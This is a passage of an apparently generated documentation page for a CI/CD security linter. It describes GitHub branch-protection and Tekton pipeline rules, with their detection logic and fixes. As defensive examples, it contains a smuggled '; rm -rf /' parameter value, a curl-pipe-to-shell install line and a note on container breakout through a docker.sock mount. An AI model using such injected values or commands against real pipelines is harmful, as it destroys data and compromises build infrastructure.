**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_pull_request_reviews.require_code_owner_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` covers the bare review-count knob; this rule scopes specifically to whose review counts. The check evaluates only the protection-rule toggle; verifying that an actual ``CODEOWNERS`` file exists at ``.github/CODEOWNERS`` (and covers the right paths) is left to the recommendation, since the GitHub API surfaces the file's presence as a separate contents request the SCM provider does not fetch.

**Recommendation.** In the default-branch protection rule, enable ``Require review from Code Owners``. Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (or ``docs/CODEOWNERS``) mapping directories to the team or individual responsible. The GitHub UI auto-requests review from the matched owners on every PR that touches a covered path; combined with this branch-protection knob, the merge is blocked until they approve.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path don't need the routing CODEOWNERS provides — but the protection knob still helps when a new team member joins. Suppress via ignore-file when the team intentionally stays flat.

**Source:** [`SCM-011`](../providers/scm.md#scm-011) in the [SCM provider](../providers/scm.md).

#### `SCM-012`: Default branch protection keeps stale reviews after a push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-012 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_pull_request_reviews.dismiss_stale_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` ensures a review is required at all; this rule ensures the approval the team relies on actually corresponds to the diff being merged.

**Recommendation.** In the default-branch protection rule, enable ``Dismiss stale pull request approvals when new commits are pushed``. Approvals will be cleared every time the PR head moves; the reviewer has to re-approve the latest diff before merge, closing the time-of-check / time-of-use gap an attacker can exploit by amending the branch after approval.

**Source:** [`SCM-012`](../providers/scm.md#scm-012) in the [SCM provider](../providers/scm.md).

#### `SCM-013`: Default branch protection does not require conversation resolution <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-013 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_conversation_resolution.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Severity is LOW because the rule documents process discipline rather than a structural vulnerability — but unresolved security comments are a common upstream cause of incidents.

**Recommendation.** In the default-branch protection rule, enable ``Require conversation resolution before merging``. PRs cannot land until every review comment is marked resolved. The friction is small (the PR author clicks ``Resolve`` after addressing) and the payoff is concrete: review comments can't be ignored to ship faster.

**Source:** [`SCM-013`](../providers/scm.md#scm-013) in the [SCM provider](../providers/scm.md).

#### `SCM-014`: Default branch protection does not require approval of the most recent push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-014 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_pull_request_reviews.require_last_push_approval`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with SCM-012 (dismiss stale reviews) — both close the same approval-time-of-check / merge-time-of-use gap from different angles.

**Recommendation.** In the default-branch protection rule, enable ``Require approval of the most recent reviewable push``. The reviewer and the most recent pusher must be different identities; an attacker controlling one collaborator account can no longer ship a malicious diff under another collaborator's approval.

**Source:** [`SCM-014`](../providers/scm.md#scm-014) in the [SCM provider](../providers/scm.md).

#### `SCM-015`: Secret scanning push protection is not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-015 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code.

**How this is detected.** Reads ``security_and_analysis.secret_scanning_push_protection.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Strongly paired with SCM-004 (secret scanning enabled): SCM-004 catches credentials after the push, SCM-015 stops them at the push. Both should be on for high-trust repos.

**Recommendation.** Enable secret scanning push protection under the repository's Settings -> Code security -> Push protection. Pushes containing matched credential patterns are refused by GitHub before the commit is accepted, so the credential never enters git history. Authors get an immediate remediation prompt; the bypass-with-justification flow preserves the audit trail when a legitimate test-case credential needs to land.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Push protection covers the GitHub-managed pattern set (~200 token patterns from major providers). Custom-pattern support requires GitHub Advanced Security on private repos; public repos get the GitHub-managed set free.

**Source:** [`SCM-015`](../providers/scm.md#scm-015) in the [SCM provider](../providers/scm.md).

#### `SCM-016`: Private vulnerability reporting is not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-016 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified.

**How this is detected.** Reads ``security_and_analysis.private_vulnerability_reporting.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Severity is LOW because the rule documents process readiness rather than a structural vulnerability — but having no private reporting channel means the next external researcher's report is either a public issue or nothing.

**Recommendation.** Enable private vulnerability reporting under the repository's Settings -> Code security -> Private vulnerability reporting. Researchers get a private ``Security`` tab where they can submit details directly to maintainers; the maintainers can then triage, request a CVE, coordinate disclosure timing, and merge a fix without exposing the bug publicly until ready.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that publish a SECURITY.md with an alternative out-of-band reporting channel (security@ mailbox, HackerOne / Bugcrowd program) cover the same control via a different mechanism. Suppress via ignore-file when the alternative is in place and documented.

**Source:** [`SCM-016`](../providers/scm.md#scm-016) in the [SCM provider](../providers/scm.md).

#### `SCM-017`: Repository has no CODEOWNERS file <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-017 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Probes the three canonical CODEOWNERS locations via ``GET /repos/{owner}/{repo}/contents/<path>``. Fires when none of the three returns a file response. Pairs with SCM-011 (the protection-rule toggle): SCM-011 covers intent, SCM-017 covers reality. A repo with both set is auditing the path-scoped review actually happens.

**Recommendation.** Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (the GitHub-recommended location), ``CODEOWNERS`` at the repo root, or ``docs/CODEOWNERS``. Map directories to the team or individual responsible for them. With SCM-011's ``require_code_owner_reviews`` knob enabled, GitHub auto-requests review from the matched owners on every PR; without the file, the toggle is meaningless and any reviewer can approve any change.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path may legitimately skip CODEOWNERS — the file adds no routing in that case. Suppress via ignore-file when the team intentionally stays flat. The same suppression applies to SCM-011.

**Source:** [`SCM-017`](../providers/scm.md#scm-017) in the [SCM provider](../providers/scm.md).

#### `SCM-018`: Required PR reviews can be bypassed by named identities <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-018 }

**Evidences:** [`1.1.5`](#ctrl-1-1-5) Ensure any change to code requires the review of additional strong authenticators.

**How this is detected.** Reads ``required_pull_request_reviews.bypass_pull_request_allowances`` from the branch protection payload. Fires when any of ``users`` / ``teams`` / ``apps`` is non-empty. Surfaces the counts so the operator can locate the bypass entries in the GitHub UI without re-running the audit manually.

**Recommendation.** In the default-branch protection rule, clear ``Allow specified actors to bypass required pull requests`` (``required_pull_request_reviews.bypass_pull_request_allowances`` in the API). Required reviews are only as strong as the bypass list. If a release-bot account needs to merge automated PRs, prefer a separate protection rule for the bot's branch namespace rather than a bypass entry on the default branch.

**Seen in the wild.**

- Multiple GitHub Security Lab writeups attribute post-incident review-control gaps to legacy bypass entries: a contractor onboarded years earlier is listed in the allowance, a compromise of that contractor account merges tampered code despite the team having added required reviews on the default branch.

**Source:** [`SCM-018`](../providers/scm.md#scm-018) in the [SCM provider](../providers/scm.md).

#### `SCM-019`: Push restrictions allowlist names individual users <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-019 }

**Evidences:** [`1.1.17`](#ctrl-1-1-17) Ensure default branches' commits are protected from being deleted/rewritten.

**How this is detected.** Reads ``restrictions.users`` from the branch protection payload. Fires when the list is non-empty. ``restrictions`` itself being absent is the default GitHub posture (no push allowlist; review gates govern access) and passes this rule. Teams and apps in ``restrictions`` are not flagged — the rule audits the personal-account subset specifically.

**Recommendation.** In the default-branch protection rule, audit the ``Restrict who can push to matching branches`` allowlist (``restrictions`` in the API). Move each individual user into a GitHub team and add the team instead, or replace with a GitHub App / bot service account when the entry is an automation. Named user entries are personal-compromise vectors that bypass every PR-review gate on the branch.

**Known false positives.**

- A break-glass admin account intentionally listed for incident response is a legitimate use case. Suppress via ignore-file once the account's access has been reviewed (MFA, hardware token, audit-logged use).

**Source:** [`SCM-019`](../providers/scm.md#scm-019) in the [SCM provider](../providers/scm.md).

#### `TKN-001`: Tekton step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Applies to ``Task`` and ``ClusterTask`` kinds. The image must contain ``@sha256:`` followed by a 64-char hex digest. Any tag-only reference, including ``:latest``, fails.

**Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.

**Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).

#### `TKN-002`: Tekton step runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Detection fires on a step with ``securityContext.privileged: true``, ``securityContext.runAsUser: 0``, ``securityContext.runAsNonRoot: false``, ``securityContext.allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every step. A privileged step shares the node's kernel namespaces; a malicious or compromised step image then has root on the build node, breaking the boundary between build and cluster.

**Source:** [`TKN-002`](../providers/tekton.md#tkn-002) in the [Tekton provider](../providers/tekton.md).

#### `TKN-003`: Tekton param interpolated unsafely in step script <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-003 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** Fires on any ``$(params.X)`` or ``$(workspaces.X.path)`` token inside a ``script:`` body that isn't already wrapped in double quotes (`"$(params.X)"`). Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``$(params.<name>)`` directly into the step ``script:``. Tekton substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Receive the parameter through ``env:`` (``valueFrom: ...`` or ``value: $(params.<name>)``) and reference the env var quoted in the script (``"$NAME"``); or pass it as a positional argument to a shell function.

**Source:** [`TKN-003`](../providers/tekton.md#tkn-003) in the [Tekton provider](../providers/tekton.md).

#### `TKN-004`: Tekton Task mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-004 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Checks ``spec.volumes[].hostPath`` (legacy v1beta1 form), ``spec.workspaces[].volumeClaimTemplate.spec.storageClassName == 'hostpath'``, and ``spec.podTemplate`` host-namespace flags.

**Recommendation.** Use Tekton ``workspaces:`` backed by ``emptyDir`` or ``persistentVolumeClaim`` instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` on the Task's ``podTemplate``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the build break out of the pod and act as the underlying node.

**Source:** [`TKN-004`](../providers/tekton.md#tkn-004) in the [Tekton provider](../providers/tekton.md).

#### `TKN-005`: Literal secret value in Tekton step env or param default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-005 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than a ``$(params.X)`` / ``valueFrom`` reference.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``params[].default``. Task manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`TKN-005`](../providers/tekton.md#tkn-005) in the [Tekton provider](../providers/tekton.md).

#### `TKN-006`: Tekton run lacks an explicit timeout <span class="pg-sev pg-sev--low">LOW</span> { #detail-tkn-006 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** Applies to ``PipelineRun``, ``TaskRun``, and ``Pipeline``. For Pipelines, the rule looks for ``spec.tasks[].timeout`` as evidence of intent. ``Task`` / ``ClusterTask`` themselves don't carry a timeout, the timeout lives on the concrete run.

**Recommendation.** Set ``spec.timeouts.pipeline`` (or ``spec.timeout`` on a TaskRun) on every PipelineRun and TaskRun. A misbehaving step otherwise pins a build pod for the cluster's default timeout (1h). For long jobs, set a generous explicit value (``2h``, ``6h``) rather than leaving it implicit.

**Source:** [`TKN-006`](../providers/tekton.md#tkn-006) in the [Tekton provider](../providers/tekton.md).

#### `TKN-007`: Tekton run uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-007 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** An explicit ``serviceAccountName: default`` setting is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` on every ``TaskRun`` and ``PipelineRun`` to a least-privilege ServiceAccount that carries only the secrets and RBAC the run actually needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for build pods.

**Source:** [`TKN-007`](../providers/tekton.md#tkn-007) in the [Tekton provider](../providers/tekton.md).

#### `TKN-008`: Tekton step script pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-tkn-008 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Uses the cross-provider ``CURL_PIPE_RE`` and ``TLS_BYPASS_RE`` regexes so detection is consistent with the GHA / GitLab / CircleCI / Cloud Build providers.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the step image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the step runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Tasks running entirely against an internal mirror (``curl https://internal-mirror/install.sh | sh`` where the mirror is the same supply chain as the task image itself) carry less marginal risk than a public-internet fetch, but the rule still fires because the curl-pipe primitive is the structural signal. ``curl -k`` to a TLS endpoint with a known self-signed CA likewise triggers; the canonical fix is to install the CA into the step image and drop ``-k``, but per-task suppression via ``--ignore-file`` is the escape hatch.

**Source:** [`TKN-008`](../providers/tekton.md#tkn-008) in the [Tekton provider](../providers/tekton.md).

#### `TKN-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-009 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Detection mirrors GHA-006 / BK-009 / CC-006, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in the Task / Pipeline document. The rule only fires on artifact-producing Tasks (those that invoke ``docker build`` / ``docker push`` / ``buildah`` / ``kaniko`` / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Tasks don't trip it.

**Recommendation.** Add a signing step to the Task, either a dedicated ``cosign sign`` step after the build, or use the official ``cosign`` Tekton catalog Task as a referenced step. The Task should sign by digest (``cosign sign --yes <repo>@sha256:<digest>``) so a re-pushed tag can't bypass the signature.

**Source:** [`TKN-009`](../providers/tekton.md#tkn-009) in the [Tekton provider](../providers/tekton.md).

#### `TKN-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-010 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Tasks.

**Recommendation.** Add an SBOM-generation step. ``syft <artifact> -o cyclonedx-json > $(workspaces.output.path)/sbom.json`` runs in the official ``syft`` Tekton catalog Task. ``cyclonedx-cli`` and ``cdxgen`` are alternatives. Publish the SBOM as a Workspace result so downstream Tasks can consume it.

**Source:** [`TKN-010`](../providers/tekton.md#tkn-010) in the [Tekton provider](../providers/tekton.md).

#### `TKN-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-011 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked), [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Tekton Chains is the Tekton-native answer, once enabled on the cluster, every TaskRun's outputs are signed and attested without per-Task wiring. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``attest-build-provenance``, ``witness run``). Tasks produced by tekton-chains pass on the ``cosign attest`` match.

**Recommendation.** After the build step, run ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` (or use the ``tekton-chains`` controller, which signs and attests every TaskRun automatically when configured). Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`TKN-011`](../providers/tekton.md#tkn-011) in the [Tekton provider](../providers/tekton.md).

#### `TKN-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-tkn-012 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec, dependency-check. Walks every Task / Pipeline / *Run document; passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner step. ``trivy fs $(workspaces.src.path)`` for source / filesystem; ``trivy image <ref>`` for container images. The official Tekton catalog ships ``trivy-scanner`` and ``grype-scanner`` Tasks if you'd rather reference one. Fail the step on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`TKN-012`](../providers/tekton.md#tkn-012) in the [Tekton provider](../providers/tekton.md).

---

_This page is generated. Edit `pipeline_check/core/standards/data/cis_supply_chain.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py cis_supply_chain`._
